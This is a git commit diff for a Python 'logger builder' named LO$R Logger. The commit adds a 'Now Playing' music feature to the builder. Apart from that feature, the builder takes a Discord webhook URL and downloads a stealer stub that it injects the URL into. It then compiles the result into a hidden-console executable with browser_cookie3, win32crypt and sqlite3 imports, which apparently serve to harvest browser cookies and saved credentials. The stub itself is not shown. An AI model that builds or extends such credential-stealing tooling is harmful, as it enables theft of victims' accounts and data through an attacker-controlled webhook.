ce6dc8651313b701401a32247f9153ef72f90133
LO$R <106779656+madhead341@users.noreply.github.com>
2023-04-08 19:41:12 +0200

    added 'Now Playing'

--- LOSR-Logger.py
+++ LOSR-Logger.py
@@ -14,14 +14,14 @@ import json
 import threading
 from tkinter import Tk
 
+author = "! LO$R#0001"
+
 music_dir = "assets/music"
 
-pygame.mixer.init()
-
-music_files = [os.path.join(music_dir, f) for f in os.listdir(music_dir) if f.endswith(".mp3")]
+music_files = os.listdir(music_dir)
 
 os.system(f'cls & title LO$R Logger Builder!')
-Write.Print(Center.XCenter("""
+banner = ("""
  /$$        /$$$$$$     /$$    /$$$$$$$        /$$                                                        
 | $$       /$$__  $$  /$$$$$$ | $$__  $$      | $$                                                        
 | $$      | $$  \ $$ /$$__  $$| $$  \ $$      | $$        /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$ 
@@ -33,41 +33,47 @@ Write.Print(Center.XCenter("""
                      \_  $$_/                                      /$$  \ $$ /$$  \ $$                    
                        \__/                                       |  $$$$$$/|  $$$$$$/                    
                                                                    \______/  \______/                                                                                                               
-                                                                    made by ! LO$R#0001\n"""), Colors.blue_to_purple, interval=0)
+                                                                    made by ! LO$R#0001\n""")
 
-random.shuffle(music_files)
+print(Colorate.Vertical(Colors.purple_to_blue, banner, 2))
 
-for file in music_files:
-    pygame.mixer.music.load(file)
-    pygame.mixer.music.queue(file)
+random_song = random.choice(os.listdir(music_dir))
+current_song = random.choice(music_files)
 
+pygame.mixer.init()
+pygame.mixer.music.load(music_dir + "/" + current_song)
+song_title = os.path.splitext(current_song)[0]
+
+message = "Now Playing: {}".format(song_title)
+print(Colorate.Vertical(Colors.purple_to_blue, message, 2))
 pygame.mixer.music.play()
 
-webhook = Write.Input("\nEnter webhook URL:", Colors.blue_to_purple, interval=0.01)
+
+webhook = Write.Input("\nEnter webhook URL:", Colors.green_to_blue, interval=0.01)
 r = requests.get(webhook)
 if r.status_code == 200:
-         Write.Print("Webhook Is Working\n",Colors.blue_to_purple, interval=0.01) 
+         Write.Print("Webhook Is Working\n",Colors.green_to_blue, interval=0.01) 
          time.sleep(1) 
 else: 
-    Write.Print("Webhook Isn't working\n",Colors.blue_to_purple, interval=0.01) 
+    Write.Print("Webhook Isn't working\n",Colors.green_to_blue, interval=0.01) 
     time.sleep(3) 
     exit()
-name = Write.Input("Enter File Name:", Colors.blue_to_purple, interval=0.01)
+name = Write.Input("Enter File Name:", Colors.green_to_blue, interval=0.01)
 stub = requests.get("https://raw.githubusercontent.com/madhead341/LOSR-Logger/main/stubs/stub.py")
 with open(f"{name}.py", 'w', encoding='utf8') as f:
     f.write(stub.text.replace("webhooker", webhook))
-Write.Print("LO$R Logger Was SucessFully Built\n",Colors.blue_to_purple, interval=0.01)
-exe = Write.Input("Complie To A Exe y/n:", Colors.blue_to_purple, interval=0.01)
+Write.Print("LO$R Logger Was SucessFully Built\n",Colors.green_to_blue, interval=0.01)
+exe = Write.Input("Complie To A Exe y/n:", Colors.green_to_blue, interval=0.01)
 if exe == "y":
    os.system(f'pyinstaller --onefile --noconsole --hidden-import="requests" --hidden-import="discord" --hidden-import="browser_cookie3" --hidden-import="shutil" --hidden-import="base64" --hidden-import="win32crypt" --hidden-import="shutil" --hidden-import="sqlite3" --hidden-import="psutil" --hidden-import="colorama" {name}.py')
    os.remove(f'{name}.spec')
-   Write.Print("LO$R Logger was sucessfully complied in dist folder\n",Colors.blue_to_purple, interval=0.01) 
+   Write.Print("LO$R Logger was sucessfully complied in dist folder\n",Colors.green_to_blue, interval=0.01) 
    time.sleep(2)
-   Write.Print("Compiled to exe. Exiting...\n",Colors.blue_to_purple, interval=0.01) 
+   Write.Print("Compiled to exe. Exiting...\n",Colors.green_to_blue, interval=0.01) 
    time.sleep(3)
    exit()
 elif exe == "n":
-   Write.Print("Not Compiled to exe. Exiting...\n",Colors.blue_to_purple, interval=0.01) 
+   Write.Print("Not Compiled to exe. Exiting...\n",Colors.green_to_blue, interval=0.01) 
    time.sleep(3)
    while pygame.mixer.music.get_busy():
-    exit()
+       exit()
